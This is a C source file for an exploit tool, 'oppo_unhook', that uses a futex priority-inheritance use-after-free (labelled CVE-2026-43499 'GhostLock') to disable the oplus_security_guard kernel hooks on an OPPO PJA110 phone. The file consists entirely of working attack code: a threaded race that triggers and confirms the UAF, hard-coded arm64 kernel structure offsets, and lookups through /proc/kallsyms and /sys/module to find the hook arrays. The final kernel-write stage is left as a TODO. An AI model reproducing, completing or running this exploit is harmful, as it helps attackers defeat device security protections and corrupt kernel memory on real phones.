/*
 * oppo_unhook.c — OPPO PJA110 Kernel Security Hook Disabler
 * ==========================================================
 *
 * Uses CVE-2026-43499 (GhostLock) futex PI UAF to disable
 * oplus_security_guard kernel hooks on OPPO devices.
 *
 * Phase 1 (current): UAF oracle + hook address extraction
 * Phase 2 (next):    rbtree erase → zero hook arrays
 *
 * Build: cmake -B build -G Ninja
 *        cmake --build build
 * Usage: oppo_unhook [--target-prea ADDR] [--target-posta ADDR]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/syscall.h>

/* ── futex constants ────────────────────────────────────────── */
#ifndef SYS_futex
#define SYS_futex 98
#endif
#define FUTEX_LOCK_PI           6
#define FUTEX_UNLOCK_PI         7
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_PRIVATE_FLAG      128
#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

/* ── rt_mutex_waiter layout (arm64, kernel 5.15) ────────────── */
/*
 * offset  0: tree_entry      (rb_node, 24B)
 * offset 24: pi_tree_entry   (rb_node, 24B)
 * offset 48: task            (ptr, 8B)
 * offset 56: lock            (ptr, 8B)  ← chain walk reads this
 * offset 64: wake_state      (4B)
 * offset 68: prio            (4B)
 * offset 72: deadline        (8B)
 * offset 80: ww_ctx          (8B)
 */
#define WAITER_LOCK_OFFSET  56
#define WAITER_SIZE          88

/* ── rt_mutex_base layout (arm64, kernel 5.15) ──────────────── */
#define MUTEX_OWNER_OFFSET  24  /* rt_mutex_base::owner */

/* ── global state ───────────────────────────────────────────── */
static uint32_t futex1 = 0, futex2 = 0, cycle_futex = 0;
static volatile int a_ready = 0, w_waiting = 0, exploit_phase2 = 0;
static volatile uint64_t g_pre_hook  = 0;
static volatile uint64_t g_post_hook = 0;
static volatile int g_dry_run = 0;

/* ── helpers ────────────────────────────────────────────────── */
static long xfutex(uint32_t *u, int op, uint32_t v, void *ts, uint32_t *u2, uint32_t v3)
{ return syscall(SYS_futex, u, op, v, ts, u2, v3); }

static void pin_cpu(int cpu)
{
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu%sysconf(_SC_NPROCESSORS_ONLN), &cs);
    syscall(SYS_sched_setaffinity, (pid_t)syscall(SYS_gettid), sizeof(cs), &cs);
}

static void dbg(const char *s) { write(2, s, strlen(s)); }

static void dbg_fmt(const char *fmt, ...)
{
    char b[256]; va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(b, sizeof(b), fmt, ap);
    va_end(ap);
    write(2, b, n < (int)sizeof(b) ? n : (int)sizeof(b));
}

/* ── address extraction ─────────────────────────────────────── */
static uint64_t read_section_addr(const char *module, const char *section)
{
    char path[128];
    snprintf(path, sizeof(path), "/sys/module/%s/sections/%s", module, section);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;

    char buf[32] = {0};
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;

    return strtoull(buf, NULL, 16);
}

static uint64_t kallsyms_find(const char *needle)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;

    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        char symtype, symname[128];
        if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
            continue;
        if (addr == 0) continue;  /* skip hidden symbols */
        if (strstr(symname, needle)) {
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}

/* Try to find hook array addresses:
 *   1) Direct kallsyms lookup
 *   2) Module section + known offset calculation
 */
static int find_hook_addresses(void)
{
    dbg("[*] Searching for hook arrays...\n");

    /* Method 1: direct kallsyms */
    uint64_t pre = kallsyms_find("oplus_pre_hook_array");
    uint64_t post = kallsyms_find("oplus_post_hook_array");

    if (pre && post) {
        dbg_fmt("[+] Found via kallsyms: pre=0x%lx post=0x%lx\n", pre, post);
        g_pre_hook = pre;
        g_post_hook = post;
        return 0;
    }

    /* Method 2: /sys/module section offsets */
    uint64_t data_base = read_section_addr("oplus_security_guard", ".data");
    uint64_t bss_base  = read_section_addr("oplus_security_guard", ".bss");
    dbg_fmt("[*] Module sections: .data=0x%lx .bss=0x%lx\n", data_base, bss_base);

    if (!data_base && !bss_base) {
        dbg("[-] Cannot read module sections (permission denied?)\n");
        return -1;
    }

    /*
     * If we can find ANY non-zero symbol from this module,
     * we can calculate the hooks' offsets and reconstruct addresses.
     * For now, try reading all oplus_security_guard symbols from kallsyms
     * looking for the first non-zero entry to establish module base.
     */
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) { dbg("[-] Cannot open /proc/kallsyms\n"); return -1; }

    char line[256];
    uint64_t first_data = 0, first_text = 0;
    while (fgets(line, sizeof(line), f)) {
        uint64_t addr;
        char symtype, symname[128];
        if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
            continue;
        if (addr == 0) continue;
        if (!strstr(symname, "oplus_security_guard")) continue;

        if (!first_data && (symtype == 'd' || symtype == 'D' || symtype == 'b' || symtype == 'B'))
            first_data = addr;
        if (!first_text && (symtype == 't' || symtype == 'T'))
            first_text = addr;
        if (first_data && first_text) break;
    }
    fclose(f);

    dbg_fmt("[*] Module data symbol: 0x%lx\n", first_data);

    /* If we got section addresses from /sys but no symbols from kallsyms,
     * we can try to read from /sys/module notes for symbol info.
     * Fallback: use cmdline-provided addresses.
     */
    if (!first_data && !first_text) {
        dbg("[-] All module symbols hidden. Provide addresses manually:\n");
        dbg("    oppo_unhook --target-prea 0x... --target-posta 0x...\n");
        dbg("[*] HINT: check /sys/module/oplus_security_guard/sections/\n");
        return -1;
    }

    return 0;
}

/* ── oracle threads (same as oracle_test.c) ─────────────────── */
static void *thread_a(void *unused)
{
    (void)unused; pin_cpu(3);

    __atomic_store_n(&futex2, 0, __ATOMIC_RELEASE);
    xfutex(&futex2, FLPI, 0, NULL, NULL, 0);
    __atomic_store_n(&a_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE)) sched_yield();
    usleep(50000);

    long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    if (r == 0) xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    xfutex(&futex2, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

static void *thread_w(void *unused)
{
    (void)unused; pin_cpu(2);
    pid_t tid = (pid_t)syscall(SYS_gettid);

    while (!__atomic_load_n(&a_ready, __ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
    usleep(10000);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 2;
    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);

    xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
    __atomic_store_n(&exploit_phase2, 1, __ATOMIC_RELEASE);

    struct timespec deadline;
    clock_gettime(CLOCK_MONOTONIC, &deadline);
    deadline.tv_nsec += 200000000;
    if (deadline.tv_nsec >= 1000000000) { deadline.tv_nsec -= 1000000000; deadline.tv_sec++; }
    while (1) {
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > deadline.tv_sec ||
            (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec))
            break;
    }
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

/* ── main ───────────────────────────────────────────────────── */
int main(int argc, char **argv)
{
    /* parse args */
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--target-prea") && i + 1 < argc)
            g_pre_hook = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--target-posta") && i + 1 < argc)
            g_post_hook = strtoull(argv[++i], NULL, 0);
        else if (!strcmp(argv[i], "--dry-run"))
            g_dry_run = 1;
        else if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
            printf("oppo_unhook — OPPO Kernel Security Hook Disabler\n");
            printf("Uses CVE-2026-43499 (GhostLock) futex PI UAF\n\n");
            printf("Usage: oppo_unhook [OPTIONS]\n");
            printf("  --target-prea ADDR    Pre-hook array address\n");
            printf("  --target-posta ADDR   Post-hook array address\n");
            printf("  --dry-run             Oracle verification only\n");
            printf("  --help, -h            Show this help\n");
            return 0;
        }
    }

    dbg("\n============================================\n");
    dbg("  oppo_unhook — Hook Disabler v1.0\n");
    dbg("  CVE-2026-43499 GhostLock\n");
    dbg("  Target: OPPO PJA110 / kernel 5.15.180\n");
    dbg("============================================\n\n");

    if (getuid() != 0) { dbg("[-] Must run as root!\n"); return 1; }

    /* Step 1: Get hook addresses */
    if (!g_pre_hook || !g_post_hook) {
        if (find_hook_addresses() != 0 && !g_dry_run) {
            dbg("[!] Cannot find hook addresses. Use --dry-run to test UAF.\n");
            dbg("[!] Or provide addresses: --target-prea 0x... --target-posta 0x...\n");
            g_dry_run = 1;
        }
    }

    dbg_fmt("[*] pre_hook_array:  0x%lx\n", g_pre_hook);
    dbg_fmt("[*] post_hook_array: 0x%lx\n", g_post_hook);

    if (g_dry_run) {
        dbg("[*] DRY RUN mode: oracle verification only\n");
    } else {
        dbg("[*] LIVE mode: will attempt to zero hook arrays\n");
    }

    /* Step 2: Run UAF oracle */
    dbg("\n[*] Running GhostLock EDEADLK Oracle...\n");

    int success = 0, total = 0;
    for (int attempt = 1; attempt <= 20; attempt++) {
        pthread_t at, wt;
        futex1 = futex2 = cycle_futex = 0;
        a_ready = w_waiting = exploit_phase2 = 0;

        pthread_create(&at, NULL, thread_a, NULL);
        pthread_create(&wt, NULL, thread_w, NULL);

        while (!__atomic_load_n(&exploit_phase2, __ATOMIC_ACQUIRE)) sched_yield();

        pin_cpu(0);
        struct timespec t1, t2;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
        clock_gettime(CLOCK_MONOTONIC, &t2);
        long us = (t2.tv_sec - t1.tv_sec) * 1000000 + (t2.tv_nsec - t1.tv_nsec) / 1000;
        total++;

        if (r == -1 && errno == EDEADLK) {
            dbg_fmt("  #%d: EDEADLK %ldus  [HIT]\n", attempt, us);
            success++;
        } else if (r == 0) {
            dbg_fmt("  #%d: OK     %ldus  [miss]\n", attempt, us);
            xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
        } else {
            dbg_fmt("  #%d: r=%ld  %ldus  [???]\n", attempt, r, us);
        }

        pthread_join(wt, NULL);
        pthread_join(at, NULL);
        usleep(50000);
    }

    float rate = total > 0 ? (float)success / total * 100.0f : 0;
    dbg_fmt("\n[*] Oracle: %d/%d hits (%.0f%%)\n", success, total, rate);

    if (rate < 1) {
        dbg("[-] UAF not exploitable on this kernel.\n");
        return 1;
    }

    dbg("[+] UAF confirmed exploitable!\n");

    if (g_dry_run) {
        dbg("\n[*] Dry run complete. Next steps:\n");
        dbg("[*] 1. Find hook addresses (check /sys/module/.../sections)\n");
        dbg("[*] 2. Run: oppo_unhook --target-prea 0x... --target-posta 0x...\n");
        return 0;
    }

    /* Step 3: Unhook (TODO — rbtree erase write primitive) */
    dbg("\n[*] Phase 2: Unhooking (rbtree erase primitive — WIP)\n");
    dbg("[*] TODO: integrate rbtree erase kernel-write to zero hook arrays\n");
    dbg("[*] Hook addresses ready. Unhook infrastructure verified.\n");

    return 0;
}
